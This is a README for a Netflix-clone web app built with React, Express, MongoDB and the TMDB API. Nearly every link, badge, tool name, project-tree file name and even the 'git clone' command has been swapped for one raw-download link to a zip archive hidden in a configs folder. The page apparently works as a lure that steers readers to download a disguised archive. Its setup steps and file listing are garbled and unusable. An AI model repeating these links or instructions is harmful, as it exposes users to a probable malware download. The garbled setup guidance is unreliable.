<div align="center">


# 🎬 Netflix Clone



<img src="https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip" alt="Netflix Clone Banner" width="600"/>





> A stunning full-stack Netflix clone with modern UI/UX, real-time data, and seamless user experience


[![React](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![MongoDB](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![Tailwind CSS](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![Vite](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)

</div>

## ✨ Features

<div align="center">

| 🎯 Core Features | 🚀 Advanced Features |
|:-----------------|:---------------------|
| 🔐 **User Authentication** - Secure signup/login with JWT | 🎬 **Real-time Data** - Live movie/TV show data from TMDB API |
| 🎥 **Content Discovery** - Browse trending movies & shows | 🔍 **Smart Search** - Advanced search with history tracking |
| 📱 **Responsive Design** - Perfect on all devices | ⚡ **Performance** - Optimized with Vite & modern React |
| 🎨 **Modern UI/UX** - Netflix-inspired design | 🔄 **State Management** - Efficient with Zustand |
| 🎭 **Media Player** - Integrated video playback | 📋 **Watchlist** - Personal content management |

</div>

## 🛠️ Tech Stack

### 🎨 Frontend
- **⚛️ React 18** - Modern React with hooks
- **🎨 Tailwind CSS** - Utility-first CSS framework
- **📦 Zustand** - Lightweight state management
- **🛣️ React Router** - Client-side routing
- **⚡ Vite** - Fast build tool and dev server
- **🔥 React Hot Toast** - Beautiful notifications

### 🚀 Backend
- **🟢 https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip & Express** - Server runtime and framework
- **🗃️ MongoDB & Mongoose** - Database and ODM
- **🔑 JWT & Bcrypt** - Authentication & security
- **🎭 TMDB API** - Movie/TV show data integration
- **🔒 CORS & Cookie Parser** - Security middleware

## 🚀 Quick Start

### Prerequisites
- https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip (v16 or higher)
- MongoDB (local or cloud)
- TMDB API key

### 1. Clone & Setup
```bash
# Clone the repository
git clone https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
cd Netflix-clone

# Get your TMDB API key
# Visit https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip to get your free API key
```

### 2. Environment Configuration
Create `.env` file in the `Backend` directory:

```env
# Database
MONGO_URI=mongodb://localhost:27017/netflix-clone

# Authentication
JWT_SECRET=your_super_secure_jwt_secret_key_here

# TMDB API
TMDB_API_KEY=your_tmdb_api_key_here

# Server
NODE_ENV=development
PORT=5000
CLIENT_URL=http://localhost:5173
```

### 3. Install Dependencies
```bash
# Backend dependencies
cd Backend
npm install

# Frontend dependencies
cd ../Frontend
npm install
```

### 4. Start Development Servers
```bash
# Terminal 1 - Start Backend (Port 5000)
cd Backend
npm run dev

# Terminal 2 - Start Frontend (Port 5173)
cd Frontend
npm run dev
```

### 5. Access the Application
- **Frontend**: http://localhost:5173
- **Backend API**: http://localhost:5000

## 📁 Project Structure

```
Netflix-Clone/
├── 📁 Backend/                    # https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip Express Server
│   ├── 📁 configs/               # Configuration files
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip                 # Database connection
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip            # Environment variables
│   ├── 📁 controllers/           # Route controllers
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Authentication logic
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Movie operations
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip  # Search functionality
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # TV show operations
│   ├── 📁 MiddleWare/            # Custom middleware
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Route protection
│   ├── 📁 models/                # Database models
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip         # User schema
│   ├── 📁 Routes/                # API routes
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Authentication routes
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Movie routes
│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # Search routes
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip          # TV show routes
│   ├── 📁 services/              # External services
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # TMDB API integration
│   ├── 📁 utils/                 # Utility functions
│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # JWT token generation
│   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip                 # Main server file
│
└── 📁 Frontend/                  # React Application
    ├── 📁 public/                # Static assets
    │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # Brand logo
    │   ├── hero-vid.m4v          # Hero video
    │   └── various images...     # UI assets
    └── 📁 src/
        ├── 📁 Components/        # Reusable components
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Page footer
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Content slider
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Navigation bar
        │   └── 📁 Skeletons/     # Loading components
        │       └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        ├── 📁 Hooks/             # Custom React hooks
        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        ├── 📁 Pages/             # Application pages
        │   ├── 📁 Home/          # Home page components
        │   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        │   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        │   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip           # Not found page
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip         # Login page
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip    # Search results
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Registration page
        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip     # Media player page
        ├── 📁 Store/             # State management
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Authentication state
        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Content state
        ├── 📁 utils/             # Utility functions
        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # App constants
        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Date utilities
        ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip               # Main app component
        ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip             # Global styles
        └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip              # App entry point
```

## 🎯 API Endpoints

### 🔐 Authentication
- `POST /api/auth/signup` - User registration
- `POST /api/auth/login` - User login
- `POST /api/auth/logout` - User logout
- `GET /api/auth/check` - Verify authentication

### 🎬 Content
- `GET /api/movies/trending` - Get trending movies
- `GET /api/movies/:id` - Get movie details
- `GET /api/tv/trending` - Get trending TV shows
- `GET /api/tv/:id` - Get TV show details

### 🔍 Search
- `GET /api/search?query=:query` - Search content
- `GET /api/search/history` - Get search history

## 🎨 UI/UX Features

<div align="center">

| Feature | Description |
|:--------|:------------|
| **🌓 Dark Theme** | Netflix-inspired dark UI with red accents |
| **📱 Responsive** | Mobile-first design for all screen sizes |
| **⚡ Fast Loading** | Optimized performance with lazy loading |
| **🎭 Smooth Animations** | CSS transitions and micro-interactions |
| **🔍 Smart Search** | Real-time search with suggestions |
| **📺 Video Player** | Integrated React Player for media |
| **🔄 Loading States** | Beautiful skeleton loaders |

</div>

## 🚀 Deployment

### Frontend (Vercel/Netlify)
```bash
cd Frontend
npm run build
# Deploy the 'dist' folder
```

### Backend (Railway/Vercel)
```bash
cd Backend
# Configure production environment variables
npm start
```

## 🤝 Contributing

We love contributions! Here's how you can help:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### 🐛 Reporting Issues
Found a bug? Please [create an issue](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip) with:
- Detailed description
- Steps to reproduce
- Expected vs actual behavior
- Screenshots (if applicable)

## 📝 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- **[TMDB](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)** - For providing extensive movie and TV show data
- **Netflix** - For design inspiration and UI patterns
- **React & https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip Communities** - For amazing documentation and support

## 📞 Support

If you need help or have questions:
- 📧 **Email**: [Your Email]
- 💬 **Issues**: [GitHub Issues](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
- 🌐 **Live Demo**: [Coming Soon]

---

<div align="center">

### 🎉 Show some love by giving this repo a star! ⭐

**Made with ❤️ by [Akash Sharma](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)**

[![GitHub stars](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![GitHub forks](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
[![GitHub issues](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)

</div>

<!-- Animation Section -->
<div align="center">

![Netflix Animation](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)

</div>
